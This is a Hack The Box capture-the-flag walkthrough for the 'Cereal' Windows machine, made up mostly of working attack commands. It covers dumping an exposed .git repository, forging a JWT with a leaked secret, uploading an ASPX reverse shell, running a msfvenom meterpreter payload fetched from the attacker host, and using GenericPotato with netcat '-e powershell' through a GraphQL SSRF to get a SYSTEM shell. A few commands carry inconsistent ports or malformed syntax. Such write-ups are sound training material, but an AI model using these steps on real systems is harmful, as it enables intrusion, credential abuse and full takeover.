# Cereal 
IP : 10.10.10.217
OS : windows


Start by adding the domain to /etc/hosts
```bash
echo "10.10.10.217 cereal.htb" >> /etc/hosts
```


## recon
```bash
nmap -sV -sC -p- -v cereal.htb
```

| Port | service |
| ---- | ------- |
| 80   | http    |
| 443  | https   |
| 22   | ssh     |

Lets take a look at http and https, while nmap finish the scan. 
The http redirect us to https. 

A simple login page
![[Pasted image 20210510082113.png]]


look at the cert from nmap scan 

```bash
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 1A506D92387A36A4A778DF0D60892843
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Cereal
| ssl-cert: Subject: commonName=cereal.htb
| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
| Issuer: commonName=cereal.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-11-11T19:57:18
| Not valid after:  2040-11-11T20:07:19
| MD5:   8785 41e5 4962 7041 af57 94e3 4564 090d
|_SHA-1: 5841 b3f2 29f0 2ada 2c62 e1da 969d b966 57ad 5367
|_ssl-date: 2021-05-10T06:15:12+00:00; +1s from scanner time.
| tls-alpn: 
|_  http/1.1
````

It tells us about a sub domain "source.cereal.htb" add that to /etc/hosts file.

Error page and path to file
![[Pasted image 20210510082228.png]]

let use Seclists wordlist
https://github.com/danielmiessler/SecLists


````bash
gobuster dir -u https://source.cereal.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 50 -k
````

````bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://source.cereal.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/10 02:41:19 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 157] [--> https://source.cereal.htb/uploads/]
/aspnet_client        (Status: 301) [Size: 163] [--> https://source.cereal.htb/aspnet_client/]
/.                    (Status: 500) [Size: 10090]                                             
/Uploads              (Status: 301) [Size: 157] [--> https://source.cereal.htb/Uploads/]      
/.git                 (Status: 301) [Size: 154] [--> https://source.cereal.htb/.git/]         
/Aspnet_client        (Status: 301) [Size: 163] [--> https://source.cereal.htb/Aspnet_client/]
/UPLOADS              (Status: 301) [Size: 157] [--> https://source.cereal.htb/UPLOADS/]      
/aspnet_Client        (Status: 301) [Size: 163] [--> https://source.cereal.htb/aspnet_Client/]

````

lets try and see if we can dump anything from .git using gittools. 

````bash
./gitdumper.sh https://source.cereal.htb/.git /home/kali/htb/cereal/gitdump
````

Go to the extractor folder and use the bash on the gitdump folder. 

````bash
./extractor.sh ../../gitdump/ /home/kali/htb/cereal/ex_dump/
````

Go to ex_dump folder, look like a c# visual studio project. let see if we can find anything of interresst.

There two way of doing this the manual way or use find to help us a bit. 

````bash
find ./ -type f -exec grep -H 'password' {} \;  
````
We find nothing of interrest here, but code reference to password 
````bash
find ./ -type f -exec grep -H 'secret' {} \;  
````
Bingo we fund a secret key

````output
./3-8f2a1a88f15b9109e1f63e4e4551727bfb38eee5/Services/UserService.cs:                var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");
./3-8f2a1a88f15b9109e1f63e4e4551727bfb38eee5/Startup.cs:            var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");
````

key = secretlhfIH&FY*#oysuflkhskjfhefesf

deserialization can’t use [ysoserial](https://github.com/frohoff/ysoserial) because of custom protection, but we can use deserialization of the DownloadManager object for upload aspx shell.

vulnerability in the file "ClientApp/src/AdminPage/AdminPage.jsx".

With help of this xss we can do server-side requests and trigger the deserialization.

But for that we need to create our jwt_token with exposed secret.

https://github.com/ticarpi/jwt_tool
````bash
pip3 install -r requirements.txt
echo -n '{"alg:"HS256","typ":"JWT"}' | base64
eyJhbGc6IkhTMjU2IiwidHlwIjoiSldUIn0=
echo -n '{"name":"1","exp":"1620718411"}' | base64 -w0
eyJuYW1lIjoiMSIsImV4cCI6IjE2MjA3MTg0MTEifQ==  

python3 jwt_tool.py -b -S hs256 -p 'secretlhfIH&FY*#oysuflkhskjfhefesf' $(echo -n '{"alg":"HS256","typ":"JWT"}' | base64).$(echo -n '{"name": "1", "exp":"1621237098"}' | base64 -w0).
````

my jwt_token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMSIsImV4cCI6MTYyMTIzODA1MH0.kC7tc1r6MvmHQ9l0HbG2zTi8wA0Wom4UUlzF47i9aYI

google aspx reverse shell and pick the first one . 
[shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)
Modify ip and port.

After that create a folder `www` and add all files inside that and then start the `python` server on port `80`.

and open a `netcat` listner on port 9001 which you add on `shell.aspx`

Then run the python script and wait for `1 min`

As soon as you got `request` on python server run the `curl` command and get your beautiful `shell`.

 ````bash
python3 -m http.server 80
nc -nvlp 8001
python3 exploit.py
curl -k https://source.cereal.htb/uploads/shell.aspx
````

 And we got user, get the flag it come to escalate
 
 ## escalate
 
 What is the device listning too
 netstat -nao | findstr /i "listening"

````cmd 
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1612
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       860
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8172           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       468
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       320
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1064
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       616
  TCP    10.10.10.217:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:49668        0.0.0.0:0              LISTENING       3520
  TCP    127.0.0.1:49672        0.0.0.0:0              LISTENING       3780
  TCP    [::]:22                [::]:0                 LISTENING       1612
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       860
  TCP    [::]:443               [::]:0                 LISTENING       4
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       4
  TCP    [::]:8172              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       468
  TCP    [::]:49665             [::]:0                 LISTENING       320
  TCP    [::]:49666             [::]:0                 LISTENING       1064
  TCP    [::]:49667             [::]:0                 LISTENING       604
  TCP    [::]:49670             [::]:0                 LISTENING       616
  TCP    [::1]:49668            [::]:0                 LISTENING       3520
````

Port 8080 looks interesting because we can't see that port in our nmap scan.

But first we need to forward the port because port 8080 listening on localhost.
we could use chisel for that, but let with meterpreter.

And we also see in our enumeration `SEImpersonation` is enable so we run `JuicyPotato` to admin.

````cmd
whoami /all
````

````cmd
SER INFORMATION
----------------

User Name    SID                                           
============ ==============================================
cereal\sonny S-1-5-21-1433318354-2681105707-1558593885-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID                                                             Attributes                                        
==================================== ================ =============================================================== ==================================================
Everyone                             Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568                                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\source.cereal.htb        Well-known group S-1-5-82-1091461672-2110406625-1707532520-1965434010-2231625233 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

````

Let's create a `msfvenom` payload first.

````bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.200 lport=8002 -b "\x00\x0a" -a x86 --platform windows -f exe -o trustme.exe
````

create a meterpreter listener
````bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set Lhost 10.10.14.200
set lport 8002
run
````

on the box, download the file and run trustme.exe
````cmd
powershell
wget http://10.10.14.200:8080/trustme.exe -o trustme.exe
./trustme.exe
````

we now need to forward the port
````bash
portfwd add -l 8003 -p 8080 -r 127.0.0.1
````

Start by visting the page
![[Pasted image 20210510102134.png]]

lets scan the port

````bash
nmap -p 8003 127.0.0.1

PORT     STATE SERVICE
8081/tcp open  blackice-icecap
````

What about the source code. 

````javascript
<script>
    fetch('/api/graphql', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        },
        body: JSON.stringify({ query: "{ allPlants { id, location, status } }" })
    }).then(r => r.json()).then(r => r.data.allPlants.forEach(d => document.getElementById('opstatus').innerHTML += `<tr><th scope="row">${d.id}</th><td>${d.location}</td><td>${d.status}</td></tr>`))
</script>
````

it use graphql api, google it and try and find a exploit

https://labs.bishopfox.com/tech-blog/design-considerations-for-secure-graphql-apis


https://github.com/micahvandeusen/GenericPotato
compile the project, you will need.
ntapidognet.xml, GenericPotato.exe
[windows netcat](https://github.com/int0x33/nc.exe)

transfer all the files to the windows box
````
wget http://10.10.14.200:8080/nc64.exe -o nc64.exe
wget http://10.10.14.200:8080/NtApiDotNet.xml -o NtApiDotNet.xml
wget http://10.10.14.200:8080/GenericPotato.exe -o GenericPotato.exe
````

Start a listener
````bash
nc -nvlp 8004
````

Execute genericPotato on the box
````cmd
.\GenericPotato.exe -p "C:\Users\sonny\Downloads\tmp\nc64.exe" -a "10.10.14.200 8004 -e powershell" -e HTTP -l 8005
````

````bash
curl -k -X "POST" -H "Content-Type: application/json" --data-binary '{"query":"mutation{updatePlant(plantId:2, version:2.2, sourceURL:\"http://localhost:8005\")}"}' 'http://localhost:8003/api/graphql'
````

And we got system access time to get the flag and finish off the box. 


hash -> 0ea7ef7c6bf8a4d87c373c589e061063
https://0xdedinfosec.github.io/posts/htb-cereal/